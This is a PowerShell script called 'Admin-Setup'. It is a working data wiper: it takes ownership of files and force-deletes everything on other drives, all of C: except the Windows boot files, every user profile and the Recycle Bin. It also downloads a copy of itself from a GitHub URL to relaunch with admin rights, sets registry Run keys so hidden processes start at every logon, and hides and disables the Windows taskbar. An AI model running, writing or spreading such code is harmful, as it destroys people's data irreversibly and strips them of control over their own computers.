<#
.SYNOPSIS
  One script. Other drives first, then C: (keep Windows only), delete every C:\Users profile, Recycle Bin last.
  Shows a progress bar and ETA. Live: -ConfirmPhrase WIPE-ALL-DATA
#>
[CmdletBinding()]
param(
  [ValidateSet('All','HideBar','Badges','Wipe')]
  [string]$Mode = 'All',
  [string]$ConfirmPhrase = ''
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'Continue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
$script:AdminDir = Join-Path $env:USERPROFILE 'admin'
$script:Url = 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1'
$script:Live = ($ConfirmPhrase -eq 'WIPE-ALL-DATA')
$script:Done = 0
$script:Total = 1
$script:T0 = Get-Date
$script:Bar = $null
$script:Lbl = $null
$script:Eta = $null
$script:Win = $null
function Test-Admin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  return (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-Self {
  foreach ($c in @($PSCommandPath, $MyInvocation.MyCommand.Path)) {
    if ($c -and (Test-Path -LiteralPath $c)) { return $c }
  }
  return $null
}
function L([string]$m) {
  New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
  $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $m
  Add-Content (Join-Path $script:AdminDir 'Admin-Setup.log') $line
  Write-Host $line
}
function Show-Bar {
  Add-Type -AssemblyName System.Windows.Forms, System.Drawing
  $w = New-Object System.Windows.Forms.Form
  $w.Text = 'Admin Setup - wiping'
  $w.Size = New-Object System.Drawing.Size(640, 160)
  $w.StartPosition = 'CenterScreen'
  $w.TopMost = $true
  $w.FormBorderStyle = 'FixedDialog'
  $w.MaximizeBox = $false
  $l = New-Object System.Windows.Forms.Label
  $l.AutoSize = $false; $l.Width = 600; $l.Height = 40; $l.Left = 16; $l.Top = 12
  $e = New-Object System.Windows.Forms.Label
  $e.AutoSize = $false; $e.Width = 600; $e.Height = 22; $e.Left = 16; $e.Top = 54
  $p = New-Object System.Windows.Forms.ProgressBar
  $p.Left = 16; $p.Top = 82; $p.Width = 590; $p.Height = 24; $p.Minimum = 0; $p.Maximum = 100
  $w.Controls.AddRange(@($l,$e,$p))
  $w.Show(); $w.Refresh()
  $script:Win = $w; $script:Lbl = $l; $script:Eta = $e; $script:Bar = $p
}
function Tick([string]$Path) {
  $script:Done++
  $pct = 0
  if ($script:Total -gt 0) { $pct = [Math]::Min(100, [int](100.0 * $script:Done / $script:Total)) }
  $elapsed = ((Get-Date) - $script:T0).TotalSeconds
  $remain = 0
  if ($script:Done -gt 0 -and $pct -lt 100) { $remain = [Math]::Max(0, ($elapsed / $script:Done) * ($script:Total - $script:Done)) }
  $eta = [TimeSpan]::FromSeconds([int]$remain)
  $msg = "{0}/{1}  {2}%  {3}" -f $script:Done, $script:Total, $pct, $Path
  Write-Progress -Activity 'Wiping drives' -Status $msg -PercentComplete $pct -SecondsRemaining ([int]$remain)
  if ($script:Lbl) { $script:Lbl.Text = $msg }
  if ($script:Eta) { $script:Eta.Text = ('Elapsed {0:mm\:ss}   remaining ~ {1:hh\:mm\:ss}' -f ([TimeSpan]::FromSeconds($elapsed)), $eta) }
  if ($script:Bar) { $script:Bar.Value = $pct }
  if ($script:Win) { $script:Win.Refresh(); [System.Windows.Forms.Application]::DoEvents() }
  L $msg
}
function Kill-Item([string]$Path) {
  if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { Tick $Path; return }
  L "DELETE $Path"
  if ($script:Live) {
    cmd /c "attrib -s -h -r `"$Path`" /s /d >nul 2>&1"
    cmd /c "takeown /F `"$Path`" /R /D Y >nul 2>&1"
    cmd /c "icacls `"$Path`" /grant *S-1-5-32-544:F /T /C /Q >nul 2>&1"
    cmd /c "del /f /s /q `"$Path`" >nul 2>&1"
    try { Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue } catch {}
    if (Test-Path -LiteralPath $Path -PathType Container) {
      $e = Join-Path $env:TEMP ('z' + [guid]::NewGuid().ToString('N'))
      New-Item -ItemType Directory -Force -Path $e | Out-Null
      cmd /c "robocopy `"$e`" `"$Path`" /MIR /R:0 /W:0 /NFL /NDL /NJH /NJS /MT:8 >nul"
      cmd /c "rd /s /q `"$Path`""
      Remove-Item $e -Force -ErrorAction SilentlyContinue
    }
  }
  if (Test-Path -LiteralPath $Path) { L "LEFT $Path" } else { L "GONE $Path" }
  Tick $Path
}
function Invoke-Wipe {
  $os = $env:SystemDrive.TrimEnd('\').TrimEnd(':')
  $jobs = New-Object System.Collections.Generic.List[string]
  Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3, 6 } | ForEach-Object {
    $let = $_.DeviceID.TrimEnd(':')
    if ($let -eq $os) { return }
    Get-ChildItem -LiteralPath ($let + ':\') -Force -ErrorAction SilentlyContinue | ForEach-Object { [void]$jobs.Add($_.FullName) }
  }
  $keep = @('windows','boot','bootmgr','bootnxt','bootsect.bak','recovery','$winreagent','system volume information','pagefile.sys','hiberfil.sys','swapfile.sys','users')
  Get-ChildItem -LiteralPath ($os + ':\') -Force -ErrorAction SilentlyContinue | ForEach-Object {
    $n = $_.Name.ToLowerInvariant()
    if ($keep -contains $n) { return }
    [void]$jobs.Add($_.FullName)
  }
  $usersRoot = Join-Path ($os + ':\') 'Users'
  if (Test-Path -LiteralPath $usersRoot) {
    Get-ChildItem -LiteralPath $usersRoot -Force -ErrorAction SilentlyContinue | ForEach-Object { [void]$jobs.Add($_.FullName) }
  }
  $script:Total = [Math]::Max(1, $jobs.Count)
  $script:Done = 0
  $script:T0 = Get-Date
  Show-Bar
  L ("Jobs={0} live={1}" -f $script:Total, $script:Live)
  L 'Other drives first'
  $osRoot = ($os + ':\').ToLowerInvariant()
  foreach ($p in $jobs) {
    if (-not $p.ToLowerInvariant().StartsWith($osRoot)) { Kill-Item $p }
  }
  L 'C: next, then all user profiles'
  foreach ($p in $jobs) {
    if ($p.ToLowerInvariant().StartsWith($osRoot)) { Kill-Item $p }
  }
  L 'Recycle Bin last'
  if ($script:Live) {
    try { Clear-RecycleBin -Force -ErrorAction SilentlyContinue } catch {}
    Get-CimInstance Win32_LogicalDisk | ForEach-Object {
      $rb = $_.DeviceID.TrimEnd(':') + ':\$Recycle.Bin'
      if (Test-Path -LiteralPath $rb) {
        Get-ChildItem -LiteralPath $rb -Force -ErrorAction SilentlyContinue | ForEach-Object { Kill-Item $_.FullName }
      }
    }
  }
  if ($script:Bar) { $script:Bar.Value = 100 }
  if ($script:Lbl) { $script:Lbl.Text = 'Done' }
  if ($script:Eta) { $script:Eta.Text = 'Finished' }
  if ($script:Win) { Start-Sleep 2; try { $script:Win.Close() } catch {} }
  Write-Progress -Activity 'Wiping drives' -Completed
  L 'WIPE DONE'
}
function Start-HideBar {
  $m = New-Object System.Threading.Mutex($false, 'Local\AdminSetupHideTaskbar')
  if (-not $m.WaitOne(0, $false)) { return }
  Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public static class TrayHide {
  [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern IntPtr FindWindow(string a, string b);
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
  [DllImport("user32.dll")] public static extern bool EnableWindow(IntPtr h, bool e);
  public static void Hide() {
    IntPtr x = FindWindow("Shell_TrayWnd", null); if (x != IntPtr.Zero) { ShowWindow(x,0); EnableWindow(x,false); }
    IntPtr y = FindWindow("Shell_SecondaryTrayWnd", null); if (y != IntPtr.Zero) { ShowWindow(y,0); EnableWindow(y,false); }
  }
}
'@
  while ($true) { try { [TrayHide]::Hide() } catch {}; Start-Sleep -Milliseconds 400 }
}
function Start-Badges {
  $m = New-Object System.Threading.Mutex($false, 'Local\AdminSetupFolderLogo')
  if (-not $m.WaitOne(0, $false)) { return }
  Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase, System.Drawing
  function ToBmp([System.Drawing.Image]$Img) {
    if (-not $Img) { return $null }
    $ms = New-Object System.IO.MemoryStream
    $Img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $ms.Position = 0
    $b = New-Object System.Windows.Media.Imaging.BitmapImage
    $b.BeginInit(); $b.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $b.StreamSource = $ms; $b.EndInit(); $b.Freeze(); $ms.Dispose(); return $b
  }
  function Ico([string]$p) { try { return ToBmp ([System.Drawing.Icon]::ExtractAssociatedIcon($p).ToBitmap()) } catch { return $null } }
  $xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" WindowStyle="None" AllowsTransparency="True" Background="Transparent" ShowInTaskbar="False" Topmost="True" ResizeMode="NoResize" SizeToContent="WidthAndHeight">
  <StackPanel Orientation="Horizontal" Margin="8,8,8,10">
    <Grid Width="64" Height="64" Margin="0,0,18,0" Cursor="Hand" Name="BtnFolder">
      <Ellipse Fill="#FF2A2A2A" Stroke="#FFE6B422" StrokeThickness="2.2"/>
      <Image Name="ImgFolder" Width="30" Height="30"/>
    </Grid>
    <Grid Width="64" Height="64" Cursor="Hand" Name="BtnPs">
      <Ellipse Fill="#FF172233" Stroke="#FF3B9AE1" StrokeThickness="2.2"/>
      <Image Name="ImgPs" Width="30" Height="30"/>
    </Grid>
  </StackPanel>
</Window>
'@
  $w = [Windows.Markup.XamlReader]::Parse($xaml)
  $w.FindName('ImgFolder').Source = (Ico (Join-Path $env:SystemRoot 'explorer.exe'))
  $w.FindName('ImgPs').Source = (Ico (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'))
  function Place { $w.Left = [Math]::Max(0, ([System.Windows.SystemParameters]::PrimaryScreenWidth - $w.ActualWidth) / 2); $w.Top = [System.Windows.SystemParameters]::PrimaryScreenHeight - $w.ActualHeight - 16 }
  $w.FindName('BtnFolder').Add_MouseLeftButtonUp({ Start-Process explorer.exe $env:USERPROFILE | Out-Null })
  $w.FindName('BtnPs').Add_MouseLeftButtonUp({ Start-Process (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe') | Out-Null })
  $w.Add_ContentRendered({ Place })
  $t = New-Object System.Windows.Threading.DispatcherTimer
  $t.Interval = [TimeSpan]::FromSeconds(3)
  $t.Add_Tick({ $w.Topmost = $true; Place })
  $t.Start()
  [void]$w.ShowDialog()
}

if ($Mode -eq 'HideBar') { Start-HideBar; return }
if ($Mode -eq 'Badges') { Start-Badges; return }

if (-not (Test-Admin)) {
  $self = Get-Self
  if (-not $self) {
    New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
    $self = Join-Path $script:AdminDir 'Admin-Setup.ps1'
    Invoke-WebRequest -UseBasicParsing -Uri $script:Url -OutFile $self
  }
  $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$self`" -Mode $Mode"
  if ($script:Live) { $arg += ' -ConfirmPhrase WIPE-ALL-DATA' }
  Start-Process "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList $arg
  return
}

New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
$ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$self = Get-Self
$safe = Join-Path $env:TEMP 'Admin-Setup.ps1'
if ($self) {
  Copy-Item $self $safe -Force -ErrorAction SilentlyContinue
  Copy-Item $self (Join-Path $script:AdminDir 'Admin-Setup.ps1') -Force -ErrorAction SilentlyContinue
}
$run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
New-Item $run -Force | Out-Null
New-ItemProperty $run -Name AdminSetupHideTaskbar -Value "`"$ps`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$safe`" -Mode HideBar" -Force | Out-Null
New-ItemProperty $run -Name AdminSetupFolderLogo -Value "`"$ps`" -STA -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$safe`" -Mode Badges" -Force | Out-Null
Start-Process $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$safe,'-Mode','HideBar') | Out-Null
Start-Process $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$safe,'-Mode','Badges') | Out-Null

if ($Mode -eq 'Wipe' -or $Mode -eq 'All') { Invoke-Wipe }
L 'DONE'
try { Start-Process notepad.exe (Join-Path $script:AdminDir 'Admin-Setup.log') } catch {}
